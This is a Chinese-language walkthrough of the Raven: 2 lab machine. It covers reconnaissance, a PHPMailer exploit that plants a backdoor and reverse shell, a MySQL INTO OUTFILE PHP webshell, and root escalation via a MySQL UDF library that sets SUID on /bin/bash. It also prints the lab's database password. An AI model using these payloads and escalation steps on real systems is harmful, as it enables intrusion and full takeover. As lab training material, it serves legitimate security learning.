# 信息收集
## 主机发现
```bash
arp-sacn -I eth1 -l
nmap -sn -PR 192.168.230.0/24
```
![](file-20260813113657392.png)
## 端口扫描
```bash
nmap -sS -Pn -p- 192.168.230.145
```
![](file-20260813113657393.png)
## 对端口的综合扫描
```bash
nmap -sS -sV -A -O -p 22,80,111,50049 192.168.230.145
```
![](file-20260813113657395.png)
## 使用其它工具再扫描看看有没有遗漏(其实应该先使用这个探测信息)
```bash
fsacn -h 192.168.230.145 -p 1-65535
```
![](file-20260813113657396.png)
## 指纹识别
```
whatweb <web网站>
```
![](file-20260813113657397.png)
## 目录收集
```bash
dirsearch -u <url>
gobuster fuzz -u <url/FUZZ> -w <wordlist_path> -b 404
```
![](file-20260813113657399.png)
## Raven: 2 靶机信息整合
### 靶机

| 靶机    | 信息                         |
| ----- | -------------------------- |
| IP地址  | 192.168.230.145            |
| MAC地址 | 00:0C:29:2D:42:11 (VMware) |
| 操作系统  | Linux 3.2 - 4.14 (Debian)  |
| 开放端口  | 22, 80, 111, 50049         |

### 端口

|端口|服务|版本|备注|
|---|---|---|---|
|22|SSH|OpenSSH 6.7p1 Debian 5+deb8u4|可能有漏洞(CVE-2016-6210等)|
|80|HTTP|Apache 2.4.10 (Debian)|主要Web入口|
|111|rpcbind|2-4|RPC服务|
|50049|status|RPC #100024|RPC状态服务|

### Web站点
#### 主站 ([http://192.168.230.145/](http://192.168.230.145/))
- CMS类型: 自定义PHP站点
- 技术栈: Bootstrap 4.0.0, jQuery 2.2.4
- 发现页面:
    - index.html (首页)
    - about.html
    - contact.php (联系表单使用了PHPmailer)
    - .DS_Store (敏感文件泄露)
#### WordPress站点 ([http://192.168.230.145/wordpress/](http://192.168.230.145/wordpress/))
- 版本: WordPress 4.8.7
- jQuery版本: 1.12.4
- 登录地址: /wordpress/wp-login.php
- 存在漏洞: 4.8.7版本存在多个已知安全漏洞
### 敏感目录和文件
- /.DS_Store - Mac系统文件，可能泄露目录结构
- /vendor/ - PHP依赖目录
- /manual/ - Apache手册
- /css/, /js/, /img/, /fonts/ - 静态资源目录
- /server-status/ - 403禁止访问
#### 网站根目录
- /var/www/html/

### 乱看
- 访问http://192.168.230.145/vendor/
	/var/www/html/
- 访问http://192.168.230.145/vendor/PATH发现
	/var/www/html/vendor/
	![](file-20260813113657400.png)
- 通过不停翻阅其中信息发现高频出现**phpmailer**
	了解一下去：
	**phpMailer 的特点：**
	- 1、在邮件中包含多个 TO、CC、BCC 和 REPLY-TO。
	- 2、平台应用广泛，支持的 SMTP 服务器包括 Sendmail、qmail、Postfix、Gmail、Imail、Exchange 等等。
	- 3、支持嵌入图像，附件，HTML 邮件。
	- 4、可靠的强大的调试功能。
	- 5、支持 SMTP 认证。
	- 6、自定义邮件头。
	- 7、支持 8bit、base64、binary 和 quoted-printable 编码。
- 找到使用了phpmailer的入口
	回到网址寻找发现此网页contact.php具有邮件发送功能，因此应该此处使用了phpmailer。
	![](file-20260813113657401.png)
# 漏洞利用PHPmailer
```bash
searchsploit -q
searchsploit phpmailer
# 下载到当前目录下进行修改调整
searchsploit -m <对应脚本路径>
```
- exp下载
	![](file-20260813113657402.png)
- 修改后呈现
	先打开监听然后取访问我们写入的一句话后门路径，反弹shell成功
	![](file-20260813113657403.png)
# 进入反弹shell一段猛猛操作
## 瞎看
- 查询发现wp-config.php
	![](file-20260813113657405.png)
	![](file-20260813113657407.png)
	发现其中用户名密码，可以进行mysql登陆mysql -h 192.168.230.145 -u root -p'R@v3nSecurity' **但是端口扫描并没有发现3306或其它运行MySQL服务的端口因此这里应该只允许本地连接**
- 查看特殊权限的文件
	```bash
	sudo -l
	find / -prem -4000 -type f 2 > /dev/null
	find / -prem -2000 -type f 2 > /dev/null
	```
	![](file-20260813113657408.png)
	![](file-20260813113657409.png)
	![](file-20260813113657411.png)
## 升级终端
-发现python环境
	![](file-20260813113657412.png)
- 反弹的shell不好用升级一下：
	![](file-20260813113657413.png)
```bash
# 第1步：生成PTY（伪终端）
python -c 'import pty; pty.spawn("/bin/bash")'
- 这会在当前会话中启动一个新的`/bin/bash`，并分配一个**伪终端（PTY）**，但此时终端参数仍继承自原始Shell（有缺陷）。

# 第2步：后台化并修复终端设置
^Z                 # 将当前Shell（ncat监听进程）放到后台
stty raw -echo; fg # 关闭本地终端的回显和行缓冲，然后前台恢复
# 上面命令回车后直接敲键盘fg回复终端
- stty raw -echo：让本地终端进入“原始模式”，不再处理特殊字符（如Ctrl+C），而是直接传递给远程Shell。
- fg：把远程Shell调回前台。此时终端和远程Shell之间建立了干净的通道。

# 第3步：设置终端类型
export TERM=xterm
- 告诉远程Shell，它连接的是一个支持颜色、光标移动等功能的标准xterm终端。
```
## 尝试SUID，SGID提权 乱试
**crontab** ，这里可能会vim，nano等其它编辑器，vim因该是比较理想的
```bash
crontab -e
```
crontab -e进入nano
Ctrl + R 输入/bin/bash
Ctrl + X退出 失败了这次
![](file-20260813113657414.png)
## 上传linpeas.sh一顿扫
```bash
wget <自己的主机web服务url/linpeas.sh>
```
![](file-20260813113657416.png)
```bash
chmod +x linpeas.sh&&./linpeas.sh
```
![](file-20260813113657417.png)
发现mysql的用户名密码等信息
![](file-20260813113657418.png)
发现php.ini中配置信息
![](file-20260813113657420.png)
这里发现root，可以在终端中输入`ps -ef | grep mysqld | grep -v grep`看看运行是不是以root运行（本次靶机确实是root运行）
![](file-20260813113657421.png)
# 本地连接mysql
![](file-20260813113657423.png)
- 查看权限`show grants`
	![](file-20260813113657424.png)
## 1. 有MySQL的root权限
```sql
define('DB_PASSWORD', 'R@v3nSecurity');
mysql user: root
```
拥有MySQL的**最高权限**（root），MySQL的root用户默认拥有`FILE`权限，允许读写服务器上的文件。
## 2. `secure_file_priv`为空

```
secure_file_priv=""
```
这是关键！`secure_file_priv`控制`INTO OUTFILE`能写入哪些目录：
- **空值**（`""`）：可以写入**任意目录**
- **指定路径**（如`/tmp/`）：只能写入该目录
- **NULL**：禁止使用`INTO OUTFILE`
## 3. 写入后门
### webshell
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/wordpress/shell.php';
```
![](file-20260813113657425.png)
查看一下发现也是个低权限因此没什么用
![](file-20260813113657427.png)
### 写ssh公钥
**失败了但有收获**：通过MySQL写入SSH公钥到 `/root/.ssh/authorized_keys`，实现免密登录root。
**前提条件**：
- 已获得MySQL root权限（密码 `R@v3nSecurity`）
- MySQL的 `secure_file_priv` 为空，允许 `INTO OUTFILE` 写入任意位置
- 已在Kali生成SSH密钥对
**失败原因**：
- `/root/.ssh` 目录不存在，且 `www-data` 用户无权在 `/root` 下创建目录
- MySQL的 `system` 命令被禁用，无法通过MySQL创建目录
- 退出MySQL后是低权限用户
## UDF提权原理
UDF（User Defined Function，用户自定义函数）是MySQL提供的一种扩展机制，允许用户编写C/C++动态链接库（.so文件），在MySQL中创建自定义函数来执行系统命令。
核心逻辑：
MySQL的**root用户**默认有**FILE权限**，可以加载共享库文件（.so）
通过加载恶意UDF库，创建sys_exec()或sys_eval()函数
调用这些函数即可在操作系统层面执行任意命令
如果MySQL以root权限运行，执行的命令也是root权限

### 搜索mysql相关信息：
```sql
SELECT VERSION();
SELECT @@version_compile_os, @@version_compile_machine;
```
![](file-20260813113657428.png)
### 漏洞利用
搜索载荷
```bash
searchsploit mysql udf
```
![](file-20260813113657430.png)
```bash
# 搜索并复制到当前目录
searchsploit -m linux/local/1518.c

# 查看代码（确认是否需要修改）
cat 1518.c

# 编译（如果缺少mysql头文件）
sudo apt install libmysqlclient-dev

# 编译生成.so文件
gcc -shared -fPIC -I/usr/include/mysql 1518.c -o udf.so
```
**查看下载的exp中也可以直接查看使用方法！**
![](file-20260813113657431.png)
通过wget将编译后的结果传到指定的目录下
![](file-20260813113657432.png)
![](file-20260813113657433.png)
### 确认插件目录
```sql
SELECT @@plugin_dir;
```
![](file-20260813113657434.png)
### 将UDF库复制到插件目录
```sql
SELECT LOAD_FILE('/tmp/udf_msf.so') INTO DUMPFILE '/usr/lib/mysql/plugin/udf_msf.so';
```
![](file-20260813113657435.png)
### 创建UDF函数
```sql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME '1518.so';这条有用
```
### 提权
```sql
SELECT do_system('chmod +s /bin/bash');
```

